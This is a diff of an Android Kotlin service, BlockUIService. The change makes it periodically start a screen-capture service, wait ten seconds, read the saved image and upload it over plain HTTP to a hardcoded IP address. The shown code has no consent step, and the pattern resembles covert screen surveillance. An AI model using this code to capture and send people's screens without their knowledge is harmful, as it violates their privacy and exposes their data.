@@ -2,11 +2,9 @@ package work.matse.blockui
 
 import android.app.Service
 import android.content.ContentValues
-import android.content.ContentValues.TAG
 import android.content.Context
 import android.content.Intent
 import android.content.SharedPreferences
-import android.content.pm.PackageManager
 import android.graphics.Bitmap
 import android.graphics.Canvas
 import android.graphics.PixelFormat
@@ -18,7 +16,6 @@ import android.os.IBinder
 import android.provider.MediaStore
 import android.view.*
 import android.widget.Button
-import androidx.core.app.ActivityCompat
 import androidx.core.view.doOnAttach
 import kotlinx.coroutines.*
 import okhttp3.MediaType
@@ -27,12 +24,17 @@ import okhttp3.OkHttpClient
 import okhttp3.RequestBody
 import retrofit2.Retrofit
 import retrofit2.converter.gson.GsonConverterFactory
+import screenshot.Capture
+import screenshot.CaptureService
 import server.API
 import server.APIService
-import java.io.*
+import java.io.File
+import java.io.FileOutputStream
+import java.io.IOException
+import java.io.OutputStream
+import java.lang.Thread.sleep
 import java.util.*
 import java.util.concurrent.TimeUnit
-
 
 
 class BlockUIService : Service(), CoroutineScope {
@@ -56,7 +58,7 @@ class BlockUIService : Service(), CoroutineScope {
         .baseUrl("http://70.34.216.175:8000/")
         .build()
 
-    //сервис
+    //сервис API
     private val service = APIService(retrofit.create(API::class.java))
     //запуск многопоточности
     private val job = SupervisorJob()
@@ -124,8 +126,13 @@ class BlockUIService : Service(), CoroutineScope {
 
         val monitor = object : TimerTask() {
             override fun run() {
-                val screen = getScreenShotFromView(viewOverlay!!)
-                val file = File(saveMediaToStorage(screen!!)!!)
+                val screenService : Intent? = Intent(getBaseContext(), CaptureService::class.java)
+                startService(screenService) //getScreenShotFromView(viewOverlay!!)
+                //stopService(screenService)
+                sleep(10000)
+                var str : String = (Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_PICTURES)).toString()
+                str += "/inaut.jpg"
+                val file = File(str)
                 val requestFile = RequestBody.create(MediaType.parse("image/jpeg"), file)
                 val body1 = MultipartBody.Part.createFormData("image", file?.name, requestFile)
                 launchUI {
@@ -176,40 +183,13 @@ class BlockUIService : Service(), CoroutineScope {
         return layoutParams
     }
 
+
     private fun getScreenShotFromView(v: View): Bitmap? {
-        var screenshot: Bitmap? = null
-        screenshot = Bitmap.createBitmap(v.measuredWidth, v.measuredHeight, Bitmap.Config.ARGB_8888)
+        var screenshot = Bitmap.createBitmap(v.measuredWidth, v.measuredHeight, Bitmap.Config.ARGB_8888)
         val canvas = Canvas(screenshot)
         v.draw(canvas)
+
         return screenshot
-    }
-
-    private fun saveMediaToStorage(bitmap: Bitmap) : String? {
-        val filename = "${System.currentTimeMillis()}.jpg"
-        var fos: OutputStream? = null
-
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
-            contentResolver?.also { resolver ->
-                val contentValues = ContentValues().apply {
-                    put(MediaStore.MediaColumns.DISPLAY_NAME, filename)
-                    put(MediaStore.MediaColumns.MIME_TYPE, "image/jpg")
-                    put(MediaStore.MediaColumns.RELATIVE_PATH, Environment.DIRECTORY_PICTURES)
-                }
-                val imageUri: Uri? =
-                    resolver.insert(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, contentValues)
-                fos = imageUri?.let { resolver.openOutputStream(it) }
-            }
-        } else {
-            val imagesDir = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_PICTURES)
-            val image = File(imagesDir, filename)
-            fos = FileOutputStream(image)
-        }
-        fos?.use {
-            bitmap.compress(Bitmap.CompressFormat.JPEG, 100, it)
-        }
-        var str : String = (Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_PICTURES)).toString()
-        str +=  '/' + filename
-        return str
     }
 
     private fun loadFile() : File? {
